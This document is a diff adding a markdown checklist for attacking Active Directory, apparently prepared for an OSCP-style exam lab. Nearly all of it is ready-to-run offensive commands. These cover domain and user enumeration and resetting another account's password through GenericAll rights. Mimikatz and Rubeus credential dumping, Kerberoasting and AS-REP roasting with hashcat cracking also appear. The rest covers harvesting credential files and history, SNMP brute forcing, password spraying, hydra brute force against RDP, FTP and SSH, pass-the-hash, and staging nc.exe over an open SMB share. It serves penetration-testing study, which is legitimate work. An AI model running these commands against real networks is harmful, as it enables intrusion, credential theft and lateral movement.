@@ -1,0 +1,199 @@
+# AD Enumeration
+## Resources
+- [CME Cheatsheet](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
+- [PowerView Cheatsheet](https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet)
+
+## Checklist
+
+### 00. Scanning
+
+`proxychains nmap -sT 21,22,23,25,53,80,88,135,161,389,445,8000,8080,3389,5985,3306,3307,1433,5432 -iL int_hosts.txt`
+
+
+### 01. Getting Users and Groups
+- What users belong to groups that allow remote management? (RDP, winRM)
+
+#### On Windows (Depends on Domain Policies)
+##### Net
+- `net user /domain` all users in domain
+- `net user username /domain` information on a domain user
+- `net group /domain` 
+- `net group groupname /domain`
+
+##### PowerView
+[Cheatsheet](https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet)
+**Test for SID you control with *genericall* on another user/group**
+- `Get-ObjectAcl -Identity "robert" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
+- `"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID`
+	- `net user username newpassword /domain`
+
+**Kerberoastable Users**
+- `Get-NetUser -Domain msp.local | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname`
+
+**Computers in the domain**
+- `Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem`
+
+**List groups**
+- `Get-NetGroup -Domain internal.msp.local | select name`
+
+**Members of a group**
+- `Get-DomainGroupMember "Domain Admins" -Recurse`
+
+#### On Kali
+##### SMB
+###### Creds:
+- `cme smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --users`
+- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute`
+- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --groups`
+- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users`
+- `crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam`
+ 
+##### LDAP
+###### Creds:
+`ldapsearch -x -H ldap://172.16.250.10 -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
+
+##### RPC
+###### No Creds:
+`rpcclient -U "" -N 10.10.10.X`
+###### Creds:
+`rpcclient -U "medtech.com/wario%Mushroom!" 172.16.250.10`
+
+---
+
+### 02. Searching for Passwords
+#### On Windows
+##### Mimikatz [cheatsheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)
+**Requires admin permissions**
+- `privilege::debug` `token::elevate`
+- `sekurlsa::logonpasswords`
+	- `ekeys` `credman` `wdigest`
+- `lsadump::sam`
+	- `secrets`
+- `.\mimikatz.exe "token::elevate" "lsadump::secrets" exit`
+
+##### Rubeus
+**Requires admin permissions**
+**Kerberoasting**
+- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
+- `sudo hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt --force`
+**AS-REP Roasting**
+- `.\Rubeus.exe asreproast /nowrap`
+- `sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force`
+
+##### Cached Credentials
+**Database Files**
+- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+- `keepass2john Database.kdbx > Keepasshash.txt`
+- `john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt`
+- Move the database to `~/keepass` and interact with `kpcli`
+
+**PowerShell history**
+- `Get-History` 
+* `(Get-PSReadlineOption).HistorySavePath`
+-  `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Run for each user)
+
+**Interesting Files**
+- `cmdkey /list`
+- In Users directories `Get-ChildItem -Path C:\Users\ -Include *.txt,*.log,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+- On Filesystem `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+- `sysprep.*` `unattend.*`
+- `Group Policies` `gpp-decrypt <hash>`
+
+#### On Kali
+##### LDAP
+- `ldapsearch -x -H ldap://172.16.250.10 -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
+- `ldapsearch -x -H ldap://172.16.250.10 -D 'wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
+
+##### SMB
+- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --shares`
+- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-auth --shares`
+- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions`
+- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers`
+ 
+##### SNMP
+- `sudo nmap -sU -p 161 --script snmp-brute 192.168.194.149`
+- `sudo nmap -sU -p 161 --script snmp-win32-users 192.168.194.149`
+- `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.194.149`
+- `snmpwalk -v 1 -c public 192.168.194.149 NET-SNMP-EXTEND-MIB::nsExtendObjects`
+- `snmpwalk -v2c -c public 192.168.194.149 | grep <string>`
+	- STRING
+	- USER
+	- PASSWORD
+	- hrSWRunParameters
+	- -i "login\|fail"
+	- `-E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`
+
+##### Impacket
+###### Kerberos
+`impacket-GetUserSPNs corp.com/meg:'VimForPowerShell123!' -dc-ip 192.168.201.70 -outputfile hashes.kerb`
+###### AS-REP Roast
+`impacket-GetNPUsers corp.com/meg:'VimForPowerShell123!' -dc-ip 192.168.201.70 -outputfile dave.hash`
+
+
+
+---
+
+### 03. Compile 
+- Make a list of users
+	- make sure to differentiate `local` and `domain` users!
+- Make a list of hashes and passwords or anything you think might be a password
+	- `domain_hashes.txt`
+	- `domain_passwords.txt`
+- Check the `password policy` to make sure you're not locking yourself out
+	- **On Windows:**`net accounts /domain`
+	- **On Kali:** `cme smb 172.16.10.10 --pass-pol` (Might need valid creds)
+
+
+---
+
+### 04. SPRAY EVERYTHING
+- specify with and without domain
+- [[[Pass the Hash]]](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
+
+#### Kerberos
+**Password Spray**
+`proxychains -q /home/kali/go/bin/kerbrute passwordspray -d oscp.exam users.txt hghgib6vHT3bVWf --dc 10.10.103.152 -vvv`
+**Bruteforce**
+`proxychains -q /home/kali/go/bin/kerbrute bruteuser -d oscp.exam jeffadmin passwords.txt --dc 10.10.103.152 -vvv`
+
+#### SMB
+`proxychains -q /home/kali/.local/bin/cme smb 172.16.201.10-14 172.16.201.82-83 -u users.txt -p passwords.txt -d medtech.com --continue-on-success`
+
+`proxychains -q /home/kali/.local/bin/cme smb 172.16.201.10-14 172.16.201.82-83 -u users.txt -p passwords.txt --continue-on-success`
+
+`cme smb 192.168.201.10 -u users.txt -H '<HASH>' --continue-on-success`
+
+`cme smb 192.168.201.10 -u users.txt -p passwords.txt --continue-on-success --local-auth`
+
+#### RDP
+`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt rdp://192.168.232.218:3389 -u -vV -T 40 -I`
+
+`hydra -V -f -L users.txt -P passwords.txt rdp://192.168.232.218 -u -vV -T 40 -I`
+
+#### WinRM
+`evil-winrm -i 192.168.201.10 -u jeffadmin -p 'password'`
+
+`evil-winrm -i 192.168.201.10 -u jeffadmin -H 'HASH'`
+
+#### FTP
+`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.232.218:21 -u -vV -T 40 -I`
+
+#### SSH
+`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.232.218:22 -u -vV -T 40 -I`
+
+
+## SMB Server (Windows)
+If you can't move file from Kali to the internal network, you can create a new share on DMZ.
+- Need Administrator+ on **M1**
+- Make sure to transfer the files into C:\temp you want to host
+
+**On M1:**
+`mkdir C:\temp`
+
+`New-SmbSHare -Name 'temp' -Path 'C:\temp' -FullAccess everyone`
+
+**On M2:**
+`net use \\10.10.10.20\temp`
+
+`copy \\10.10.10.20\temp\nc.exe C:\nc.exe`
+
